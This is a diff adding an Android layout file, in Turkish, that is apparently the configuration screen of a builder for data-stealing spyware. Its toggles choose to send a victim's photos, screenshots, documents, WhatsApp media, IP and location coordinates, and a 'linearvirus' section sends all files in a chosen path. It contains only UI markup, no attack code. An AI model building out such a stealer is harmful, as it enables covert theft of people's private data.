@@ -1,0 +1,706 @@
+<androidx.coordinatorlayout.widget.CoordinatorLayout
+	xmlns:android="http://schemas.android.com/apk/res/android"
+	xmlns:app="http://schemas.android.com/apk/res-auto"
+	xmlns:tools="http://schemas.android.com/tools"
+	android:id="@+id/_coordinator"
+	android:layout_width="match_parent"
+	android:layout_height="match_parent">
+	<LinearLayout
+		android:layout_width="match_parent"
+		android:layout_height="match_parent"
+		android:orientation="vertical">
+		<LinearLayout
+			android:id="@+id/linear1"
+			android:layout_width="match_parent"
+			android:layout_height="match_parent"
+			android:padding="8dp"
+			android:orientation="vertical">
+			<LinearLayout
+				android:id="@+id/linear2"
+				android:layout_width="match_parent"
+				android:layout_height="wrap_content"
+				android:padding="8dp"
+				android:orientation="vertical">
+				<TextView
+					android:id="@+id/textview1"
+					android:layout_width="wrap_content"
+					android:layout_height="wrap_content"
+					android:padding="8dp"
+					android:text="Config Yapılandırma"
+					android:textSize="20sp"
+					android:textStyle="bold" />
+				<LinearLayout
+					android:id="@+id/linear12"
+					android:layout_width="match_parent"
+					android:layout_height="80dp"
+					android:padding="8dp"
+					android:background="?colorOnError"
+					android:orientation="horizontal">
+					<LinearLayout
+						android:id="@+id/linear13"
+						android:layout_width="60dp"
+						android:layout_height="match_parent"
+						android:padding="8dp"
+						android:background="?colorPrimaryContainer"
+						android:orientation="vertical">
+						<ImageView
+							android:id="@+id/imageview1"
+							android:layout_width="wrap_content"
+							android:layout_height="wrap_content"
+							android:src="@drawable/onemli"
+							android:scaleType="center" />
+					</LinearLayout>
+					<TextView
+						android:id="@+id/textview6"
+						android:layout_width="wrap_content"
+						android:layout_height="wrap_content"
+						android:padding="8dp"
+						android:text="Hepsini Seçmek Hataya Sebep Olabilir."
+						android:textSize="15sp"
+						android:textStyle="bold"
+						android:textColor="#FFFFFF" />
+				</LinearLayout>
+			</LinearLayout>
+			<ScrollView
+				android:id="@+id/vscroll1"
+				android:layout_width="match_parent"
+				android:layout_height="match_parent">
+				<LinearLayout
+					android:id="@+id/linear3"
+					android:layout_width="match_parent"
+					android:layout_height="wrap_content"
+					android:padding="8dp"
+					android:background="@android:color/transparent"
+					android:gravity="center_horizontal"
+					android:orientation="vertical">
+					<LinearLayout
+						android:id="@+id/linear6"
+						android:layout_width="match_parent"
+						android:layout_height="wrap_content"
+						android:padding="2dp"
+						android:orientation="horizontal">
+						<LinearLayout
+							android:id="@+id/linearcihazbilg"
+							android:layout_width="match_parent"
+							android:layout_height="wrap_content"
+							android:padding="8dp"
+							android:background="?colorErrorContainer"
+							android:orientation="vertical">
+							<TextView
+								android:id="@+id/textview2"
+								android:layout_width="wrap_content"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:text="Cihaz Bilgileri"
+								android:textSize="18sp"
+								android:textStyle="bold" />
+							<LinearLayout
+								android:id="@+id/linear5"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch1"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="left|center_vertical"
+									android:text="Cihaz Markasını Gönder"
+									android:textSize="16sp"
+									android:textStyle="bold"
+									android:textColor="#F5F5F5"
+									android:layout_weight="1" />
+							</LinearLayout>
+							<LinearLayout
+								android:id="@+id/linear7"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch6"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="left|center_vertical"
+									android:text="Cihaz Modelini Gönder"
+									android:textSize="15sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+							<LinearLayout
+								android:id="@+id/linear8"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch5"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="left|center_vertical"
+									android:text="Cihaz Üreticisini Gönder"
+									android:textSize="15sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+							<LinearLayout
+								android:id="@+id/linear9"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch7"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="left|center_vertical"
+									android:text="Android Sürümünü Gönder"
+									android:textSize="15sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+							<LinearLayout
+								android:id="@+id/linear38"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch21"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="left|center_vertical"
+									android:text="SDK Seviyesi Gönder"
+									android:textSize="15sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+						</LinearLayout>
+					</LinearLayout>
+					<LinearLayout
+						android:id="@+id/linear23"
+						android:layout_width="match_parent"
+						android:layout_height="wrap_content"
+						android:padding="2dp"
+						android:orientation="horizontal">
+						<LinearLayout
+							android:id="@+id/lineardep"
+							android:layout_width="match_parent"
+							android:layout_height="wrap_content"
+							android:padding="8dp"
+							android:background="?colorErrorContainer"
+							android:orientation="vertical">
+							<LinearLayout
+								android:id="@+id/linear75"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:gravity="center_horizontal|center_vertical"
+								android:orientation="horizontal">
+								<TextView
+									android:id="@+id/textview8"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:text="Depolama Bilgileri"
+									android:textSize="18sp"
+									android:textStyle="bold"
+									android:layout_weight="1" />
+							</LinearLayout>
+							<LinearLayout
+								android:id="@+id/linear19"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch8"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="left|center_vertical"
+									android:text="Depolama (GB) Gönder"
+									android:textSize="16sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+							<LinearLayout
+								android:id="@+id/linear20"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch9"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="left|center_vertical"
+									android:text="Cihaz Ram Gönder"
+									android:textSize="15sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+						</LinearLayout>
+					</LinearLayout>
+					<LinearLayout
+						android:id="@+id/linear24"
+						android:layout_width="match_parent"
+						android:layout_height="wrap_content"
+						android:padding="2dp"
+						android:orientation="horizontal">
+						<LinearLayout
+							android:id="@+id/lineardosya"
+							android:layout_width="match_parent"
+							android:layout_height="wrap_content"
+							android:padding="8dp"
+							android:background="?colorErrorContainer"
+							android:orientation="vertical">
+							<TextView
+								android:id="@+id/textview9"
+								android:layout_width="wrap_content"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:text="Dosyalar &amp; Bilgileri"
+								android:textSize="18sp"
+								android:textStyle="bold" />
+							<LinearLayout
+								android:id="@+id/linear73"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch36"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="center_vertical"
+									android:text="Kamera Çekilenleri Gönder"
+									android:textSize="15sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+							<LinearLayout
+								android:id="@+id/linear26"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch12"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="left|center_vertical"
+									android:text="ScreenShoots Gönder"
+									android:textSize="16sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+							<LinearLayout
+								android:id="@+id/linear27"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch13"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="left|center_vertical"
+									android:text="Text Dosyalarını Gönder"
+									android:textSize="15sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+							<LinearLayout
+								android:id="@+id/linear48"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch29"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="left|center_vertical"
+									android:text="PDF Dosyalarını Gönder"
+									android:textSize="15sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+							<LinearLayout
+								android:id="@+id/linear50"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch30"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="center_vertical"
+									android:text="WhatsApp Dosyaları (Ses)"
+									android:textSize="15sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+							<LinearLayout
+								android:id="@+id/linear72"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch35"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="center_vertical"
+									android:text="WhatsApp Dosyaları (Resim)"
+									android:textSize="15sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+						</LinearLayout>
+					</LinearLayout>
+					<LinearLayout
+						android:id="@+id/linear28"
+						android:layout_width="match_parent"
+						android:layout_height="wrap_content"
+						android:padding="2dp"
+						android:orientation="horizontal">
+						<LinearLayout
+							android:id="@+id/linearagveip"
+							android:layout_width="match_parent"
+							android:layout_height="wrap_content"
+							android:padding="8dp"
+							android:background="?colorErrorContainer"
+							android:orientation="vertical">
+							<TextView
+								android:id="@+id/textview10"
+								android:layout_width="wrap_content"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:text="Ağ &amp; İp Bilgileri"
+								android:textSize="18sp"
+								android:textStyle="bold" />
+							<LinearLayout
+								android:id="@+id/linear29"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch14"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="left|center_vertical"
+									android:text="İp Adresi Gönder"
+									android:textSize="16sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+							<LinearLayout
+								android:id="@+id/linear31"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch16"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="left|center_vertical"
+									android:text="ASN Kimliğini Gönder"
+									android:textSize="15sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+							<LinearLayout
+								android:id="@+id/linear32"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch17"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="left|center_vertical"
+									android:text="Sağlayiciyi Gönder"
+									android:textSize="15sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+						</LinearLayout>
+					</LinearLayout>
+					<LinearLayout
+						android:id="@+id/linear33"
+						android:layout_width="match_parent"
+						android:layout_height="wrap_content"
+						android:padding="2dp"
+						android:orientation="horizontal">
+						<LinearLayout
+							android:id="@+id/linearkonum"
+							android:layout_width="match_parent"
+							android:layout_height="wrap_content"
+							android:padding="8dp"
+							android:background="?colorErrorContainer"
+							android:orientation="vertical">
+							<TextView
+								android:id="@+id/textview11"
+								android:layout_width="wrap_content"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:text="Konum Bilgileri"
+								android:textSize="18sp"
+								android:textStyle="bold" />
+							<LinearLayout
+								android:id="@+id/linear35"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch18"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="left|center_vertical"
+									android:text="Şehiri Gönder"
+									android:textSize="16sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+							<LinearLayout
+								android:id="@+id/linear36"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch19"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="left|center_vertical"
+									android:text="Bölgeyi Gönder"
+									android:textSize="15sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+							<LinearLayout
+								android:id="@+id/linear37"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:orientation="horizontal">
+								<com.google.android.material.materialswitch.MaterialSwitch
+									android:id="@+id/switch20"
+									android:layout_width="wrap_content"
+									android:layout_height="wrap_content"
+									android:padding="8dp"
+									android:gravity="left|center_vertical"
+									android:text="Koordinatları Gönder"
+									android:textSize="15sp"
+									android:textStyle="bold"
+									android:textColor="#FAFAFA"
+									android:layout_weight="1" />
+							</LinearLayout>
+						</LinearLayout>
+					</LinearLayout>
+					<LinearLayout
+						android:id="@+id/linear39"
+						android:layout_width="match_parent"
+						android:layout_height="wrap_content"
+						android:padding="2dp"
+						android:orientation="horizontal">
+						<LinearLayout
+							android:id="@+id/linear51"
+							android:layout_width="match_parent"
+							android:layout_height="wrap_content"
+							android:orientation="horizontal">
+							<LinearLayout
+								android:id="@+id/linearvirus"
+								android:layout_width="match_parent"
+								android:layout_height="wrap_content"
+								android:padding="8dp"
+								android:background="?colorErrorContainer"
+								android:orientation="vertical">
+								<LinearLayout
+									android:id="@+id/linear74"
+									android:layout_width="match_parent"
+									android:layout_height="wrap_content"
+									android:gravity="center_horizontal|center_vertical"
+									android:orientation="horizontal">
+									<TextView
+										android:id="@+id/textview16"
+										android:layout_width="wrap_content"
+										android:layout_height="wrap_content"
+										android:padding="8dp"
+										android:text="Özel"
+										android:textSize="18sp"
+										android:textStyle="bold"
+										android:layout_weight="1" />
+								</LinearLayout>
+								<LinearLayout
+									android:id="@+id/linear70"
+									android:layout_width="match_parent"
+									android:layout_height="wrap_content"
+									android:orientation="horizontal">
+									<TextView
+										android:id="@+id/textview17"
+										android:layout_width="wrap_content"
+										android:layout_height="wrap_content"
+										android:padding="8dp"
+										android:text="Dosya Yolundaki Tüm Dosyalar Gönderilecek"
+										android:textSize="15sp"
+										android:textStyle="bold"
+										android:textColor="#FFFFFF" />
+								</LinearLayout>
+								<LinearLayout
+									android:id="@+id/linear4"
+									android:layout_width="match_parent"
+									android:layout_height="wrap_content"
+									android:gravity="center_vertical"
+									android:orientation="horizontal">
+									<com.google.android.material.textfield.TextInputLayout
+										android:id="@+id/textinputlayout1"
+										android:layout_width="wrap_content"
+										android:layout_height="wrap_content"
+										android:layout_weight="1"
+										style="@style/Widget.MaterialComponents.TextInputLayout.OutlinedBox">
+										<EditText
+											android:id="@+id/edittext2"
+											android:layout_width="match_parent"
+											android:layout_height="wrap_content"
+											android:padding="8dp"
+											android:textSize="15sp"
+											android:textColor="#FFFFFF"
+											android:hint="Dosya yolu giriniz..."
+											android:textColorHint="#FFFFFF" />
+									</com.google.android.material.textfield.TextInputLayout>
+									<Button
+										android:id="@+id/button1"
+										android:layout_width="45dp"
+										android:layout_height="45dp"
+										android:padding="8dp"
+										android:gravity="center_horizontal|center_vertical"
+										android:textSize="12sp"
+										style="?attr/materialIconButtonFilledStyle"
+										android:checkable="true"
+										app:icon="@drawable/tamam" />
+								</LinearLayout>
+								<LinearLayout
+									android:id="@+id/linear77"
+									android:layout_width="match_parent"
+									android:layout_height="15dp"
+									android:padding="8dp"
+									android:orientation="horizontal" />
+								<LinearLayout
+									android:id="@+id/linear71"
+									android:layout_width="match_parent"
+									android:layout_height="wrap_content"
+									android:orientation="horizontal">
+									<TextView
+										android:id="@+id/textview18"
+										android:layout_width="wrap_content"
+										android:layout_height="wrap_content"
+										android:padding="8dp"
+										android:text="Kod Kabartma"
+										android:textSize="15sp"
+										android:textStyle="bold"
+										android:textColor="#FFFFFF" />
+								</LinearLayout>
+								<LinearLayout
+									android:id="@+id/linear84"
+									android:layout_width="match_parent"
+									android:layout_height="wrap_content"
+									android:gravity="center_horizontal|center_vertical"
+									android:orientation="horizontal">
+									<com.google.android.material.textfield.TextInputLayout
+										android:id="@+id/textinputlayout2"
+										android:layout_width="wrap_content"
+										android:layout_height="wrap_content"
+										android:layout_weight="1"
+										style="@style/Widget.MaterialComponents.TextInputLayout.OutlinedBox">
+										<EditText
+											android:id="@+id/edittext4"
+											android:layout_width="match_parent"
+											android:layout_height="wrap_content"
+											android:padding="8dp"
+											android:textSize="15sp"
+											android:textColor="#FFFFFF"
+											android:hint="Tekrar Sayısını Giriniz"
+											android:textColorHint="#FFFFFF" />
+									</com.google.android.material.textfield.TextInputLayout>
+									<Button
+										android:id="@+id/button2"
+										android:layout_width="45dp"
+										android:layout_height="45dp"
+										android:padding="8dp"
+										android:textSize="12sp"
+										style="?attr/materialIconButtonFilledStyle"
+										android:checkable="true"
+										app:icon="@drawable/tamam" />
+								</LinearLayout>
+							</LinearLayout>
+						</LinearLayout>
+					</LinearLayout>
+					<LinearLayout
+						android:id="@+id/linear80"
+						android:layout_width="match_parent"
+						android:layout_height="wrap_content"
+						android:orientation="horizontal">
+						<LinearLayout
+							android:id="@+id/linear83"
+							android:layout_width="match_parent"
+							android:layout_height="80dp"
+							android:orientation="horizontal" />
+					</LinearLayout>
+				</LinearLayout>
+			</ScrollView>
+		</LinearLayout>
+		<TimePicker
+			android:id="@+id/timepicker1"
+			android:layout_width="match_parent"
+			android:layout_height="wrap_content"
+			android:padding="8dp" />
+	</LinearLayout>
+	<com.google.android.material.floatingactionbutton.FloatingActionButton
+		android:id="@+id/_fab"
+		android:layout_width="wrap_content"
+		android:layout_height="wrap_content"
+		android:layout_margin="16dp"
+		android:layout_gravity="right|bottom"
+		app:srcCompat="@drawable/tamam" />
+</androidx.coordinatorlayout.widget.CoordinatorLayout>
